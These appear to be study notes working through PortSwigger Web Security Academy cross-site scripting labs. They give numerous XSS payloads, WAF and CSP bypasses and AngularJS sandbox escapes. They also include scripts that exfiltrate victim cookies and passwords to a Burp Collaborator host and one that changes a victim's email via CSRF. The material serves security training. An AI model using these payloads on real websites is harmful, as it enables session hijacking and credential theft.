1) https://portswigger.net/web-security/cross-site-scripting
2) https://portswigger.net/web-security/cross-site-scripting/exploiting
	 https://portswigger.net/web-security/cross-site-scripting/context

- [Cross-Site Scripting (XSS)](https://www.hackingarticles.in/comprehensive-guide-on-cross-site-scripting-xss/)
- https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting

- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 


## **1. DOM XSS in `document.write` sink using source `location.search`**
This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL.
To solve this lab, perform a cross-site scripting attack that calls the `alert` function.

**Analysis:**
1. Enter a random alphanumeric string into the search box.
2. Right-click and inspect the element, and observe that your random string has been placed inside an `img src` attribute.
3. Break out of the `img` attribute by searching for:
    `"><svg onload=alert(1)>`

SVG tags can include scripting capabilities, such as JavaScript, through attributes like `onload`, `onclick`, etc. This means that an attacker can inject an SVG element with an `onload` attribute to execute malicious scripts. Some web applications may not properly sanitize or filter SVG elements. Since SVG is less commonly considered in input sanitization, attackers may exploit it to bypass security filters that would catch more common tags like `<script>`.


## **2. DOM XSS in `innerHTML` sink using source `location.search`**
This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an `innerHTML` assignment, which changes the HTML contents of a `div` element, using data from `location.search`.
To solve this lab, perform a cross-site scripting attack that calls the `alert` function.

**Analysis**:
1. Enter the following into the into the search box, and click "Search".
    `<img src=1 onerror=alert(1)>`

The value of the `src` attribute is invalid and throws an error. This triggers the `onerror` event handler, which then calls the `alert()` function. As a result, the payload is executed whenever the user's browser attempts to load the page containing your malicious post.
	![[Pasted image 20240703015300.png]]


## **3. DOM XSS in jQuery anchor `href` attribute sink using `location.search` source**
This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's `$` selector function to find an anchor element, and changes its `href` attribute using data from `location.search`.
To solve this lab, make the "back" link alert `document.cookie`.

The vulnerability in the submit feedback page. It uses the jQuery library's `$` selector function to find an anchor element, and changes its `href` attribute using data from `location.search`.

**Analysis**:
1. On the Submit feedback page, change the query parameter `returnPath` to `/` followed by a random alphanumeric string.
2. Right-click and inspect the element, and observe that your random string has been placed inside an a `href` attribute.
3. Change `returnPath` to:
    `javascript:alert(document.cookie)`
    
Changing the query parameter `returnPath` to `/` followed by a random alphanumeric string we observe that our random string has been placed inside an a `href` attribute.
	![[Pasted image 20240703034210.png]]
	![[Pasted image 20240703034106.png]]


## **4. Reflected XSS into attribute with angle brackets HTML-encoded**
This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the `alert` function.

**Analysis**:
1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
2. Observe that the random string has been reflected inside a quoted attribute. Replace your input with the following payload to escape the quoted attribute and inject an event handler:
    `"onmouseover="alert(1)`
    
3. Verify the technique worked by right-clicking, selecting "Copy URL", and pasting the URL in the browser. When you move the mouse over the injected element it should trigger an alert.
	![[Pasted image 20240703053618.png]]


## **5. Stored XSS into anchor href attribute with double quotes HTML-encoded**
This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.

**Analysis**:
1. Post a comment with a random alphanumeric string in the "Website" input, then use Burp Suite to intercept the request and send it to Burp Repeater. 
2. Observe that the random string in the second Repeater tab has been reflected inside an anchor `href` attribute.
3. Repeat the process again but this time replace your input with the following payload to inject a JavaScript URL that calls alert:
    `javascript:alert(1)`
    
4. Verify the technique worked by right-clicking, selecting "Copy URL", and pasting the URL in the browser. Clicking the name above your comment should trigger an alert.
	![[Pasted image 20240713161951.png]]


## **6. Reflected XSS into a JavaScript string with angle brackets HTML encoded**
This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater. Observe that the random string has been reflected inside a JavaScript string.
2. Replace your input with the following payload to break out of the JavaScript string and inject an alert:
    `'-alert(1)-'`
    
3. Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in the browser. When you load the page it should trigger an alert.:
	![[Pasted image 20240713173758.png]]
![[Pasted image 20240713173710.png]]


## **7. XSS in a storeID parameter**
This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search` which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the `alert` function.

**Analysis**:
1. On the product pages, notice that the dangerous JavaScript extracts a `storeId` parameter from the `location.search` source. It then uses `document.write` to create a new option in the select element for the stock checker functionality.
2. Add a `storeId` query parameter to the URL and enter a random alphanumeric string as its value. Request this modified URL.In the browser, notice that your random string is now listed as one of the options in the drop-down list.
3. Right-click and inspect the drop-down list to confirm that the value of your `storeId` parameter has been placed inside a select element. Change the URL to include a suitable XSS payload inside the `storeId` parameter as follows:
    `product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>`

- JavaScript extracts a `storeId` parameter from the `location.search` source. It then uses `document.write` to create a new option in the select element for the stock checker functionality.
- Adding a `storeId` query parameter to the URL and enter a random alphanumeric string as its value we notice that the string is now listed as one of the options in the drop-down list.` ?productId=1& storeId=paein </option></select><img src="0" onerror="alert(1)"
	![[Pasted image 20240713181806.png]]
		![[Pasted image 20240713182122.png]]


## **8. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded**

This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality. AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the `ng-app` attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.

To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the `alert` function.

**Analysis**:
1. Enter a random alphanumeric string into the search box.
2. View the page source and observe that your random string is enclosed in an `ng-app` directive.
3. Enter the following AngularJS expression in the search box:
    `{{$on.constructor('alert(1)')()}}`
	![[Pasted image 20240913013110.png]]

- **AngularJS Expression Syntax (`{{}}`):** In AngularJS, expressions wrapped in `{{ }}` are used for **data binding**. When an AngularJS application renders, it processes these expressions, evaluates them, and injects the result into the HTML page.
    - `{{ 2 + 2 }}` would be evaluated and replaced with `4`.
- **The `$eval` Function:** In AngularJS, the `$eval` function allows evaluating arbitrary AngularJS expressions within the context of the current scope.
    - `$eval('2 + 2')` would evaluate the expression `'2 + 2'` and return `4`.
- **The `constructor` Property:** Every function in JavaScript has a `constructor` property, which points to the **Function constructor**. The `Function` constructor allows you to create new JavaScript functions dynamically from strings of code.
    - `Function('alert(1)')` creates a function that, when called, executes `alert(1)`.


## **10. Reflected DOM XSS**
This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink. To solve this lab, create an injection that calls the `alert()` function.

**Analysis**:
1. In Burp Suite, go to the Proxy tool and make sure that the Intercept feature is switched on.  Back in the lab, go to the target website and use the search bar to search for a random test string, such as `"XSS"`.
2. Return to the Proxy tool in Burp Suite and forward the request. On the Intercept tab, notice that the string is reflected in a JSON response called `search-results`.
3. From the Site Map, open the `searchResults.js` file and notice that the JSON response is used with an `eval()` function call.
4. By experimenting with different search strings, you can identify that the JSON response is escaping quotation marks. However, backslash is not being escaped.
	![[Pasted image 20240913022624.png]]
		![[Pasted image 20240913022737.png]]
			![[Pasted image 20240913022857.png]]
				![[Pasted image 20240913023745.png]]
- The attacker injects the backslash and code (`\"-alert(1)}//`), resulting in a malformed JSON response that breaks out of the intended structure.
- The malformed JSON is processed in the browser as JavaScript, where:
    - The `"-alert(1)` breaks the JSON string and creates a JavaScript expression with the `alert(1)` code.
    - The closing curly bracket (`}`) terminates the object.
    - The `//` comments out the rest of the response to avoid any errors.

When the injected JSON response: `{"searchTerm":"\\"-alert(1)}//", "results":[]}`
is parsed, the browser sees this JavaScript: `{"searchTerm": "\\" - alert(1)} //", "results":[]`


## **11. Stored DOM XSS**
This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the `alert()` function.

**Analysis**:
1. Post a comment containing the following vector:
	`<><img src=1 onerror=alert(1)>`
	
	In an attempt to prevent [XSS](https://portswigger.net/web-security/cross-site-scripting), the website uses the JavaScript `replace()` function to encode angle brackets. However, when the first argument is a string, the function only replaces the first occurrence. We exploit this vulnerability by simply including an extra set of angle brackets at the beginning of the comment. These angle brackets will be encoded, but any subsequent angle brackets will be unaffected, enabling us to effectively bypass the filter and inject HTML.
	![[Pasted image 20240913034111.png]]


## **12. Reflected XSS into HTML context with most tags and attributes blocked**
This lab contains a [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors. 
To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the `print()` function.

**Analysis**:
1. Inject a standard XSS vector, such as:
    `<img src=1 onerror=print()>`
    
2. Observe that this gets blocked. In the next few steps, we'll use use Burp Intruder to test which tags and attributes are being blocked.
3. Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder. In Burp Intruder, replace the value of the search term with: `<>`
4. Place the cursor between the angle brackets and click **Add §** to create a payload position. The value of the search term should now look like: `<§§>`
5. Visit the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click **Copy tags to clipboard**. In the **Payloads** side panel, under **Payload configuration**, click **Paste** to paste the list of tags into the payloads list. Click  **Start attack**.
6. When the attack is finished, review the results. Note that most payloads caused a `400` response, but the `body` payload caused a `200` response. Go back to Burp Intruder and replace your search term with:
    `<body%20=1>`
    
7. Place the cursor before the `=` character and click **Add §** to create a payload position. The value of the search term should now look like: `<body%20§§=1>`
8. Visit the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click **Copy events to clipboard**. In the **Payloads** side panel, under **Payload configuration**, click **Clear** to remove the previous payloads. Then click **Paste** to paste the list of attributes into the payloads list. Click  **Start attack**.
9. When the attack is finished, review the results. Note that most payloads caused a `400` response, but the `onresize` payload caused a `200` response.
10. Go to the exploit server and paste the following code, replacing `YOUR-LAB-ID` with your lab ID:
	```html
	<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
	```

**Workflow**:
- first we have to try out for different tags that are not blocked by WAF
	![[Pasted image 20240913043552.png]]
		![[Pasted image 20240913043613.png]]
			![[Pasted image 20240913043631.png]]
				![[Pasted image 20240913043651.png]]

- now for onload method (we need to find a substitute method that is not blocked by WAF)
	![[Pasted image 20240913043719.png]]
		![[Pasted image 20240913044102.png]]
			![[Pasted image 20240913044126.png]]
				![[Pasted image 20240913044154.png]]
					![[Pasted image 20240913044215.png]]

	- using iframe method with onload resize to automatically generate the XXS without user interaction
	![[Pasted image 20240913044440.png]]


## **12.Reflected XSS into HTML context with all tags blocked except custom ones**
This lab blocks all HTML tags except custom ones.
To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts `document.cookie`.

**Analysis**:
1. Go to the exploit server and paste the following code, replacing `YOUR-LAB-ID` with your lab ID:
    ```javascript
    `<script> location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; </script>`
    ```
2. Click "Store" and "Deliver exploit to victim".

This injection creates a custom tag with the ID `x`, which contains an `onfocus` event handler that triggers the `alert` function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the `alert` payload to be called.
	![[Pasted image 20240913050102.png]]
	![[Pasted image 20240913050151.png]]
		![[Pasted image 20240913050241.png]]
			![[Pasted image 20240913050203.png]]

- now we will create a script where we will place our malicious URL generated in order to generate an automatically XXS when user will acces it:
	![[Pasted image 20240913050351.png]]


## **13. Reflected XSS with some SVG markup allowed**
This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.
To solve the lab, perform a cross-site scripting attack that calls the `alert()` function.

**Analysis**:
1. Inject a standard XSS payload, such as:
    `<img src=1 onerror=alert(1)>`
    
2. Observe that this payload gets blocked. In the next few steps, we'll use Burp Intruder to test which tags and attributes are being blocked.
3. Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder. In the request template, replace the value of the search term with: `<>`
4. Place the cursor between the angle brackets and click **Add §** to create a payload position. The value of the search term should now be: `<§§>`
5. Visit the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click **Copy tags to clipboard**. In Burp Intruder, in the **Payloads** side panel, click **Paste** to paste the list of tags into the payloads list. Click  **Start attack**.
6. When the attack is finished, review the results. Observe that all payloads caused a `400` response, except for the ones using the `<svg>`, `<animatetransform>`, `<title>`, and `<image>` tags, which received a `200` response. Go back to the **Intruder** tab and replace your search term with:
    `<svg><animatetransform%20=1>`
    
7. Place the cursor before the `=` character and click **Add §** to create a payload position. The value of the search term should now be:
    `<svg><animatetransform%20§§=1>`
    
8. Visit the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click **Copy events to clipboard**. In Burp Intruder, in the **Payloads** side panel, click **Clear** to remove the previous payloads. Then click **Paste** to paste the list of attributes into the payloads list. Click  **Start attack**.
9. When the attack is finished, review the results. Note that all payloads caused a `400` response, except for the `onbegin` payload, which caused a `200` response.
    Visit the following URL in the browser to confirm that the alert() function is called and the lab is solved: `https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canima`

	![[Pasted image 20240913182924.png]]
		![[Pasted image 20240913184634.png]]

The `<svg>` tag can be used in **XSS (Cross-Site Scripting)** attacks because it's a container for graphics that can include various elements, including scripts and events. Since many websites allow the inclusion of SVG code, attackers can leverage it to inject malicious scripts.


## **15. Reflected XSS into a JavaScript string with single quote and backslash escaped**
This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.
To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

**Analysis**:
1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
2. Observe that the random string has been reflected inside a JavaScript string.
3. Try sending the payload `test'payload` and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string.
4. Replace your input with the following payload to break out of the script block and inject a new script:
    `</script><script>alert(1)</script>`

- single quote is escaped as backslash
	![[Pasted image 20240913195042.png]]
	- if we try to escape the backslash using our own backlash we see that is escaped as well		![[Pasted image 20240913195113.png]]
- To bypass this escaping mechanism, we need to completely break out of the JavaScript string and inject our own script.	
	  ![[Pasted image 20240913195137.png]]


## **15. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped**
This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.
To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

**Analysis**:
1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater. Observe that the random string has been reflected inside a JavaScript string.
2. Try sending the payload `test'payload` and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string.
3. Try sending the payload `test\payload` and observe that your backslash doesn't get escaped.
4. Replace your input with the following payload to break out of the JavaScript string and inject an alert:
    `\'-alert(1)//`
    
6. Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in the browser. When you load the page it should trigger an alert.

As in previous examples , quote is encoded by server by a backslash --> we are tryin to escape that  backslash using ours backslash(in this case it is no more escaped)  --> concatenate the payload in the string using (-)substraction --> commenting everything else after the payload :)


## **16. Stored XSS into `onclick` event with angle brackets(>) and double quotes(") HTML-encoded and single quotes(') and backslash(/) escaped**
This lab contains a stored cross-site scripting vulnerability in the comment functionality.
To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.

**Analysis**:
1. Post a comment with a random alphanumeric string in the "Website" input, then use Burp Suite to intercept the request and send it to Burp Repeater.
2. Make a second request in the browser to view the post and use Burp Suite to intercept the request and send it to Burp Repeater.
3. Observe that the random string in the second Repeater tab has been reflected inside an `onclick` event handler attribute.
4. Repeat the process again but this time modify your input to inject a JavaScript URL that calls `alert`, using the following payload:
    ```
    http://foo?&apos;-alert(1)-&apos;
    ```

	![[Pasted image 20240914030938.png]]
		![[Pasted image 20240914030949.png]]

As we see, characters mentioned in the lab description are escaped so we have to trick the server by HTML encode the special charachters as follows:
```
 http://foo?&apos;-alert(1)-&apos;
```
![](Pasted%20image%2020250307161359.png)

This scenario describes a **Stored Cross-Site Scripting (XSS)** attack where user input is being stored on the server and then reflected into an `onclick` event handler in HTML. The input is being partially sanitized, but not fully, leaving room for an attacker to exploit this vulnerability.


## **17. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped**

This lab contains a [reflected cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the `alert` function inside the template string.

**Analysis**:
1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater. Observe that the random string has been reflected inside a JavaScript template string.
2. Replace your input with the following payload to execute JavaScript inside the template string: `${alert(1)}`
3. Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in the browser. When you load the page it should trigger an alert. 
	![](Pasted%20image%2020250307161747.png)
	![](Pasted%20image%2020250307161836.png)
	 ![](Pasted%20image%2020250307162051.png)

## **18. Exploiting cross-site scripting to steal cookies**
This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

**Analysis**:
1. Using [Burp Suite Professional](https://portswigger.net/burp/pro), go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
2. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
    ```javascript
    <script>
     
    fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie });
    
    </script>
    ```
	 This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.
3. Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
4. Take a note of the value of the victim's cookie in the POST body.
5. Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator. Send the request to solve the lab. To prove that you have successfully hijacked the admin user's session, you can use the same cookie in a request to `/my-account` to load the admin user's account page.

Without using Burp Collaborator - Alternatively, you could adapt the attack to make the victim post their session cookie within a blog comment by [exploiting the XSS to perform CSRF](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf). However, this is far less subtle because it exposes the cookie publicly, and also discloses evidence that the attack was performed.

## **19. Exploiting cross-site scripting to capture passwords**
This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

**Analysis**:
1. Using [Burp Suite Professional](https://portswigger.net/burp/pro), go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
2. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
```html
   <input name=username id=username> 
  <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```
   This script will make anyone who views the comment issue a POST request containing their username and password to your subdomain of the public Collaborator server.
3. Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
4. Take a note of the value of the victim's username and password in the POST body. Use the credentials to log in as the victim user.

If autofill is active and accessible via JavaScript, this poses a security risk. Attackers can exploit this by injecting malicious scripts (e.g., through an XSS vulnerability) to read and send the auto filled credentials to an external server.

**Alternative**
- payload to inject
	![[Pasted image 20240915034504.png]]
		![[Pasted image 20240915034624.png]]

- Autofill relies on certain attributes in the input fields, such as `name`, `id`, and `autocomplete`.
- The browser might use the `name` or `id` attribute to identify the fields. In this case, "username" and "password" are common names that browsers use to autofill.
- Ensure these fields don’t have an `autocomplete="off"` or `autocomplete="new-password"` attribute, which would typically prevent autofill.
    ```
    <input name="username" id="username"> 
    <input type="password" name="password">
``
- Since there's no `autocomplete` attribute set to "off," browsers may attempt to autofill these fields.

**Mitigation**
- Use the `autocomplete` attribute to guide browsers not to autofill sensitive fields:
    ```
    <input name="username" id="username" autocomplete="off"> 
    <input type="password" name="password" autocomplete="new-password">
``

OR correct input form:
```
<input type="text" name="user_identifier" id="user_identifier" placeholder="Enter your user ID"> 
<input type="password" name="user_key" id="user_key" placeholder="Enter your secret key">
```
- **Use Unique `name` and `id` Attributes:**
	Avoid using common names like "username" and "password" for input fields that might prompt browsers to autofill.
- **Use `SameSite` Cookies and `HttpOnly` Attributes:**
	Protect session cookies with `SameSite` and `HttpOnly` attributes to minimize the impact of credential exfiltration.
- **Content Security Policy (CSP):**
	Implement a strict CSP to prevent inline JavaScript execution and unauthorized external requests.


## **20. Exploiting XSS to perform CSRF**
This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a [CSRF attack](https://portswigger.net/web-security/csrf) and change the email address of someone who views the blog post comments.

**Analysis**:
1. Log in using the credentials provided. On your user account page, notice the function for updating your email address.
2. If you view the source for the page, you'll see the following information:
    - You need to issue a POST request to `/my-account/change-email`, with a parameter called `email`.
    - There's an anti-CSRF token in a hidden input called `token`.This means your exploit will need to load the user account page, extract the CSRF token, and then use the token to change the victim's email address.
3. Submit the following payload in a blog comment:
```javascript
    <script>
    
     var req = new XMLHttpRequest();
     req.onload = handleResponse;
     
     req.open('get','/my-account',true); 
     req.send(); function handleResponse() { var token this.responseText.match(/name="csrf" value="(\w+)"/)[1];
      
     var changeReq = new XMLHttpRequest(); 
     changeReq.open('post', '/my-account/change-email', true); 
     changeReq.send('csrf='+token+'&email=test@test.com') };
    
     </script>
```

This will make anyone who views the comment issue a POST request to change their email address to `test@test.com`.
	![[Pasted image 20240915033546.png]]
		![[Pasted image 20240915033425.png]]

- payload to inject:
	![[Pasted image 20240915034247.png]]
		![[Pasted image 20240915034146.png]]


## 21. Reflected XSS with AngularJS sandbox escape without strings
This lab uses AngularJS in an unusual way where the `$eval` function is not available and you will be unable to use any strings in AngularJS.
To solve the lab, perform a cross-site scripting attack that escapes the sandbox and executes the `alert` function without using the `$eval` function.

**Analysis**:
1. Visit the following URL, replacing `YOUR-LAB-ID` with your lab ID:
	`https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
2. The exploit uses `toString()` to create a string without using quotes. It then gets the `String` prototype and overwrites the `charAt` function for every string. This effectively breaks the AngularJS sandbox. 
3. Next, an array is passed to the `orderBy` filter. We then set the argument for the filter by again using `toString()` to create a string and the `String` constructor property. 
4. Finally, we use the `fromCharCode` method generate our payload by converting character codes into the string `x=alert(1)`. Because the `charAt` function has been overwritten, AngularJS will allow this code where normally it would not.
	![](Pasted%20image%2020250307180914.png)

Payload to be inserted as a search parameter:
```javascript
?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```


# 22. Reflected XSS with AngularJS sandbox escape and CSP
This lab uses CSP and AngularJS.
To solve the lab, perform a cross-site scripting attack that bypasses CSP, escapes the AngularJS sandbox, and alerts `document.cookie`.

**Analysis**:
1. Go to the exploit server and paste the following code, replacing `YOUR-LAB-ID` with your lab ID:
	```javascript
	<script> 
	
	location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x'; 

	</script>
	```
2. Click "Store" and "Deliver exploit to victim". The exploit uses the `ng-focus` event in AngularJS to create a focus event that bypasses CSP. It also uses `$event`, which is an AngularJS variable that references the event object. The `path` property is specific to Chrome and contains an array of elements that triggered the event. The last element in the array contains the `window` object.
3. Normally, `|` is a bitwise or operation in JavaScript, but in AngularJS it indicates a filter operation, in this case the `orderBy` filter. The colon signifies an argument that is being sent to the filter. In the argument, instead of calling the `alert` function directly, we assign it to the variable `z`. The function will only be called when the `orderBy` operation reaches the `window` object in the `$event.path` array. This means it can be called in the scope of the window without an explicit reference to the `window` object, effectively bypassing AngularJS's `window` check.

Payload to be inserted as search parameter
```javascript
?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x
```

**Workflow**:
1. ![](Pasted%20image%2020250307181731.png)
2. ![](Pasted%20image%2020250307182518.png)
3. ![](Pasted%20image%2020250307182704.png)

# 23. Reflected XSS with event handlers and `href` attributes blocked
This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor `href` attributes are blocked.
To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the `alert` function.

Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example: `<a href="">Click me</a>`

**Analysis**:
1. Visit the following URL, replacing `YOUR-LAB-ID` with your lab ID:
	`https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E

Payload:
```javascript 
?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
```

- The payload is attempting to use **SVG (Scalable Vector Graphics)** as an attack vector.
- Inside the `<svg>` element, an `<a>` (anchor) tag is used.
- An `<animate>` element is applied to manipulate the `href` attribute of the `<a>` tag.
- The `values` attribute of `<animate>` contains `javascript:alert(1)`, which means it attempts to execute JavaScript when the animation triggers.
- The `<text>` element provides clickable text ("Click me") to lure the user into clicking the malicious link.

**Workflow**:
1. ![](Pasted%20image%2020250307183547.png)
2. when we are trying to use href anchor tag we observe that is blocked by WAF
   ![](Pasted%20image%2020250307183709.png)
	![](Pasted%20image%2020250307183822.png)
3. we will fuzz attributes from XSS cheat sheet
	![](Pasted%20image%2020250307184004.png)
4.   we will make use of svg tag combined with a text tag inside 
	![](Pasted%20image%2020250307184141.png)
	![](Pasted%20image%2020250307184208.png)
5. we still need to include an href attribute functionality that is still blocked by the WAF and we will make use of the animate tag inside of the svg 
	![](Pasted%20image%2020250307184344.png)
	![](Pasted%20image%2020250307184405.png)
		![](Pasted%20image%2020250307184456.png)

# 24. Reflected XSS in a JavaScript URL with some characters blocked
This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks.

To solve the lab, perform a cross-site scripting attack that calls the `alert` function with the string `1337` contained somewhere in the `alert` message.

**Analysis**:
1. Visit the following URL, replacing `YOUR-LAB-ID` with your lab ID:
	`https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27`
	
	Note that the alert will only be called if you click "Back to blog" at the bottom of the page.

2. The exploit uses exception handling to call the `alert` function with arguments. The `throw` statement is used, separated with a blank comment in order to get round the no spaces restriction. The `alert` function is assigned to the `onerror` exception handler.
3. As `throw` is a statement, it cannot be used as an expression. Instead, we need to use arrow functions to create a block so that the `throw` statement can be used. We then need to call this function, so we assign it to the `toString` property of `window` and trigger this by forcing a string conversion on `window`.

Payload:
```javascript
post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27`
```

**Workflow**:
1. input is reflected on this href attribute
	![](Pasted%20image%2020250308025833.png)
2. to inject inside of the fetch function we will the encoded version of the following payload:
   ![](Pasted%20image%2020250308025936.png)
	which is translated inside of the javascript as :
		![](Pasted%20image%2020250308030018.png)

# 25. Reflected XSS protected by very strict CSP, with dangling markup attack
This lab using a strict CSP that blocks outgoing requests to external web sites.
To solve the lab, first perform a cross-site scripting attack that bypasses the CSP and exfiltrates a simulated victim user's CSRF token using Burp Collaborator. You then need to change the simulated user's email address to `hacker@evil-user.net`.

You must label your vector with the word "Click" in order to induce the simulated user to click it. For example: `<a href="">Click me</a>`

You can log in to your own account using the following credentials: `wiener:peter`

**Analysis**:
1. Log in to the lab using the account provided above. Examine the change email function. Observe that there is an XSS vulnerability in the `email` parameter.
2. Go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
